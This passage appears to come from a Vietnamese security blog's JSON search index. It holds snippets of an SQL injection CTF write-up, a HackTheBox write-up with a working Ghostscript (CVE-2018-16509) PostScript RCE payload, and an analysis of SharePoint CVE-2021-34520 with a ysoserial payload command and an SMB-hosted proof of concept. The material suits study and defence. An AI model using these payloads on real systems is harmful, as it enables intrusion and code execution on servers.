Thử detect SQLi qua username=&quot;hoangnd&#39;&quot; xem thế nàoSQLi verified. Để ý răng kết quả query database trả về trong message ở trang chủ. Tiếp theo là dùng UNION attack username=&quot;aaa&#39; union select &#39;mot&#39;,&#39;hai&#39;,&#39;ba&#39;; -- a&quot;, phần username hiển thị trên message ở trang chủ như sauNhư vậy data có thể lấy ra từ column thứ hai của câu query. Bước tiếp theo chỉ cần thêm một ít kiến thức về query trong SQLite để lấy được flag, mình xin phép dừng bài viết ở đây." }, { "title": "HTB Petpet Rcbee", "url": "/posts/htb-petpet-rcbee/", "categories": "Writeups, HackTheBox", "tags": "pil, ghost script", "date": "2021-09-05 08:51:00 +0700", "snippet": "Petpet rcbee là một web challenge. Sau khi xem xét thì thấy rằng trang web chỉ có một chức năng duy nhất là upload 1 ảnh sau đó “pet” ảnh này.Oke kiểm tra source code xem có gì có thể lợi dụng để RCE thông qua file được tải lên hay khôngdef petpet(file): if not allowed_file(file.filename): return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;Improper filename&#39;}, 400 try: tmp_path = save_tmp(file) bee = Image.open(tmp_path).convert(&#39;RGBA&#39;) frames = [Image.open(f) for f in sorted(glob.glob(&#39;application/static/img/*&#39;))] finalpet = petmotion(bee, frames) filename = f&#39;{generate(14)}.gif&#39; finalpet[0].save( f&#39;{main.app.config[&quot;UPLOAD_FOLDER&quot;]}/{filename}&#39;, save_all=True, duration=30, loop=0, append_images=finalpet[1:], ) os.unlink(tmp_path) return {&#39;status&#39;: &#39;success&#39;, &#39;image&#39;: f&#39;static/petpets/{filename}&#39;}, 200 except: return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;Something went wrong&#39;}, 500Ảnh sau khi được tải được xử lý bằng hàm petpet. Bên trong thực hiện các thao tác như lưu ảnh vào file tạm, generate một ảnh gif dựa trên ảnh này, sau đó đưa nó vào thư mục theo đường dẫn là biến UPLOAD_FOLDER ở trong config. Cuối cùng là xóa ảnh trong tmp.Trang web này sử dụng một thư viện là PIL để xử lý ảnh, để xem PIL có CVE nào k. Sau khi xem xét một vòng thì có 1 CVE liên quan đến PIL và Ghostscript để RCE là CVE-2018-16509, check lại thì bên trong file docker có tồn tại cái gọi là Ghostscript thật.Sử dụng luôn craft image của CVE, chạy thử trên localOke vậy là đã RCE được, bây giờ cần làm thế nào để đọc được flag được dấu bên trong. Để ý rằng có một đường dẫn tệp được public là UPLOAD_FOLDER (/static/petpets/).Vậy chỉ cần đọc file flag và ghi vào một file bất kỳ trong đường dẫn này là xong.%!PS-Adobe-3.0 EPSF-3.0%%BoundingBox: -0 -0 100 100userdict /setpagedevice undefsavelegal{ null restore } stopped { pop } if{ legal } stopped { pop } ifrestoremark /OutputFile (%pipe%cat flag &amp;gt; application/static/petpets/test.txt) currentdevice putdeviceprops" }, { "title": "CVE-2021-34520 Microsoft Sharepoint RCE", "url": "/posts/cve-2021-34520-microsoft-sharepoint-RCE/", "categories": "One-day analysis", "tags": "cve-2021-34520, microsoft sharepoint", "date": "2021-09-04 10:36:00 +0700", "snippet": "Phân tích lỗi CVE-2021-34520Sharepoint WorkflowChúng ta có thể phân tách nghĩa của từ Workflow là làm 2 phần bao gồm “Work” nghĩa là công việc, “flow” nghĩa là dòng chảy. Flow đi chung với Work nghĩa là dòng chảy công việc, luồng công việc hay gọi là quy trình công việc. Workflow được hiểu là một quy trình lặp lại, bao gồm các nhiệm vụ cần phải hoàn thành theo một quy trình cụ thể.Một workflow bao gồm một hoặc nhiều step, trong mỗi step lại chứa một hay nhiều activity (workflow action).Trong Sharepoint có 2 kiểu workflow Built-in workflow: Đây là các workflow được xây dựng sẵn như template của sharepoint Custom workflow: Sharepoint cho phép xây dựng các workflow theo ý của người dùng. Có hai cách để tạo ra một custom workflow là sử dụng công cụ Sharepoint Designer hoặc tạo từ custom code sử dụng Visual Studio 2012 trở về sau.Sử dụng workflow trong sharepoint?Trước khi được sử dụng, các workflow sau khi được tạo sẽ được add cho một list, library hoặc content type để khiến nó khả dụng cho các documents hoặc items trong danh sách đấy. Sau đó, các workflow này có thể chạy theo các option như sau Chạy thủ công Chạy khi có thay đổi về item (thêm, xóa, sửa thông tin …)Workflow DesignerSharePoint Designer 2013 là một chương trình thiết kế web và ứng dụng được sử dụng để xây dựng và tùy chỉnh các trang web và ứng dụng trên SharePoint. Sharepoint Designer giúp bạn tạo ra các trang web giàu dữ liệu, xây dựng các workflow mạnh mẽ, hay tạo ra các giao diện đẹp và dễ chịu cho trang web.Mô tả về lỗiTài liệu của ZDI mô tả về CVE-2021-34520 như sau: Lỗ hổng tồn tại trong lớp Microsoft.SharePoint.WorkflowActions.SetVariableActivity. Một thành phần SetVariableActivity được tạo thủ công có thể dẫn đến việc khởi tạo một kiểu .NET tùy ý. Attacker có thể lợi dụng lỗ hổng này để thực thi mã từ xa.SetVariableActivity là một workflow action, vậy khả năng cao lỗ hổng này liên quan đến việc tạo và sử dụng workflow.Diff codeCài đặt bản lỗi của Sharepoint Enterprise Server 2016, lỗi tồn tại ở phiên bản sharepoint này cho đến bản patch KB5001946 và được vá ở bản KB5001976. Tiến hành cài đặt hai bản và sử dụng 7zip để gom các file dll cần thiết cho việc diff.7z.exe a dll.7z -r .\\Microsoft.Sharepoint.*.dllTiến hành gom ở 3 thư mục C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL C:\\Program Files\\Common Files\\microsoft shared C:\\inetpub\\wwwroot\\wssKết quả diff sử dụng WinMerge. Quan sát thấy có sự khác biệt khi có một hàm mới trong bản vá liên quan đến SetVariableActivity tồn tại ở lớp Microsoft.SharePoint.Workflow.SPNoCodeXomlCompilerNhìn tên hàm hiểu ngay vấn đề, hàm này dùng để vá lỗi cụ thể là validate thuộc tính ValueType của lớp SetVariableActivity. Hàm này được gọi bên trong hàm IsGoodWorkflowHàm IsGoodWorkflow lại được gọi trong hàm CompileBytesTiến hành phân tích hàm CompileBytes để xem nó được gọi từ đâuSử dụng dnspy, tìm ra được hàm ValidateWorkflowMarkupAndCreateSupportObjects. Theo tài liệu của Microsoft, khi các file workflow được tải lên, nội dung bên trong sẽ đi qua hàm này để validate và biên dịch. Như vậy để có được một kiểu .NET tùy ý ở đây chính là tạo một workflow, bên trong có action SetVariableActivity với giá trị thuộc tính ValueType được tùy chỉnh bởi User.Tạo thành công một Crafted SetVariableActivitySử dụng giao diện trên Workflow Designer, tạo một workflow, thêm một action là Set Workflow Variable vào, như vậy có thể tạo được một SetVariableActivity. Sau khi tạo xong workflow sẽ có hai file được hình thành (Khi publish thì sẽ có thêm một file .xsn hoặc .aspx). Ví dụ ở đây workflow có tên là testFile test.xoml là file markup của workflow dùng để biểu diễn các step và action. Còn file test.xoml.wfconfig.xml là file cấu hình của workflow. Ở đây mình dành sự quan tâm cho file test.xomlNgoài ValueType thì SetVariableActivity có hai thuộc tính khác là Value và Variable. Variable sẽ trỏ đến biến cần được set giá trị, biến này được khai báo ở phần RootWorkflowActivityWithData.WorkflowFields. Value là giá trị để set cho biến này.Có thể thấy ngay phần SetVariableActivity đã được tạo, tuy nhiên thuộc tính ValueType vẫn không thể control được hoàn toàn bằng việc sử dụng giao diện. Để hoàn toàn tùy chỉnh ValueType, cần tạo hai file markup và config hợp lệ ở bên ngoài (hai file markup và config có thể copy từ việc tạo 1 flow giả sau đó edit lại) và upload thẳng lên thư mục workflow của Sharepoint Designer, sau đó sử dụng công cụ này publish workflow lên sharepoint site để có thể sử dụng. Theo cách này đã có thể tạo một Crafted SetVariableActivity. Lưu ý rằng không phải thay đổi kiểu gì cũng có thể publish được mà Sharepoint Designer sẽ validate nó hợp lệ xong mới cho phép Publish. Thực nghiệm thấy rằng thay đổi giá trị thuộc tính ValueType vẫn có thể publish được.Tạo kiểu .NET nào cho RCE ?Quan sát lớp Microsoft.SharePoint.WorkflowActions.SetVariableActivityTheo tài liệu của Microsoft, hàm Execute sẽ được gọi khi chạy activity. Biến type được tạo thành từ thuộc tính ValueType. Hai vị trí khoanh đỏ sẽ là đoạn code tiềm năng để tạo object. Ở khoanh đỏ đầu tiên, sử dụng converter được lấy từ type của obj. Giá trị của biến obj được lấy từ thuộc tính Value và được convert thành type của biến cần thay đổi giá trị.Do type của biến này không thể tùy chỉnh được, vì vậy type của obj bị giới hạn ở các type cơ bản như String, Int32, … và converter của các type này sẽ không thể convert obj thành kiểu ValueType tùy ý được. Do đó suy nghĩ về khoanh đỏ thứ 2. Ở đây sẽ tạo ra một constructor của ValueType nhận một tham số đầu vào dưới dạng String. Qua một số tìm hiểu và các bài PoC được public, tìm ra được một class phù hợp chính là System.Resources.ResourceSet có constructor cần thiết.// ResourceSet ConstructorConstructor này nhận đầu vào là đường dẫn đến file .resource, tạo một ResourceHeader và gọi hàm ReadResource. Quan sát constructor của ResourceHeader// ResourceHeader ConstructorConstructor này đọc file từ đường dẫn fileName lưu vào thuộc tính _store, gọi hàm ReadResource()// ResourceHeader.ReadResource()Hàm này tạo một BinaryFormatter và lưu vào thuộc tính _objFormatter. Bây giờ quay lại hàm ReadResource của ResourceSet// ResourceSet.ReadResource()Hàm này tạo biến enum từ lớp ResourceEnumerator bên trong lớp ResourceReader Sau đó sử dụng biến này để duyệt và gọi thuộc tính Value để lấy giá trị. Kiểm tra phương thức get của thuộc tính Value bên trong ResourceEnumerator// ResourceHeader.ResourceEnumerator.Value// ResourceHeader.GetValueForNameIndex()// ResourceHeader.LoadObjectV2()// ResourceHeader.DeserializeObject()Ở đây ResourceHeader sử dụng thuộc tính _objFormatter để deserialize thuộc tính _store. Trong đó _objFormatter là một BinaryFormatter, _store là nội dung bên trong file .resources =&amp;gt; Lỗi deserialize .NETTạo file .resources chứa payloadVisual studio sử dụng Resource File Generator (Resgen.exe) để convert file .resx thành một binary resource (.resources).Tạo file .resx sử dụng chức năng add file của Visual Studio. Để thêm payload vào, chúng ta thêm node data vào trong root trong file .resx như sauPhần payload được tạo bằng cách sử dụng công cụ ysoserial.\\ysoserial.exe -o base64 -c &quot;calc&quot; -f BinaryFormatter -g TypeConfuseDelegateCuối cùng là dùng resgen để generate ra file .resourcesSau khi đã đủ lông đủ cánh, thực hiện mô phỏng CVE này.Proof of ConceptTạo một site trên sharepoint theo tutorial. Sau đó tạo một tài khoản attacker. Attacker cần có quyền tạo workflow trên site, điều khiển một máy tính có liên kết với server sharepoint.Tạo một file .resources với payload thực hiện command đơn giản là bật calculator (Resource1.resources)Tạo một SMB server đơn giản theo hướng dẫn này để tạo một folder shared cho phép quyền anonymous đọc các file bên trong, yêu cầu máy attacker có kết nối với server sharepoint. Mục đích là để tạo đường dẫn đến file .resources sử dụng cho lớp ResourceSet. Sau đó đưa file .resources đã tạo vào đây, như vậy đường dẫn được tạo có dạng//DESKTOP-9GA3D02/shared/Resource1.resourcesBước tiếp theo là tạo hai file markup và config cho workflow, phần SetVariableActivity có dạng sau (phần value để giá trị là đường dẫn đến .resources)Upload hai file lên thư mục workflow của Sharepoint Designer và publish workflow này.Kết quả sau khi workflow này được chạy là một process Calculator được tạo raKết luậnTồn tại một số lớp có gadget chain ẩn chứa bên trong các constructor. Và các constructor được sinh ra đều có lí do, nếu có thể tìm ra các lớp như vậy thì có thể nghiên cứu việc kiểm soát các param của constructor và tìm kiếm cơ hội RCE xung quanh các lớp này.REFERENCEShttps://www.zerodayinitiative.com/advisories/ZDI-21-828/https://support.microsoft.com/en-us/office/introduction-to-sharepoint-workflow-07982276-54e8-4e17-8699-5056eff4d9e3https://www.youtube.com/watch?v=JQYrqwgpAFYhttps://blog.virtosoftware.com/how-to-create-sharepoint-designer-2013-workflow/https://www.zerodayinitiative.com/blog/2020/4/28/cve-2020-0932-remote-code-execution-on-microsoft-sharepoint-using-typeconvertershttp://nikolar.com/2015/03/10/creating-network-share-with-anonymous-access/" } ]
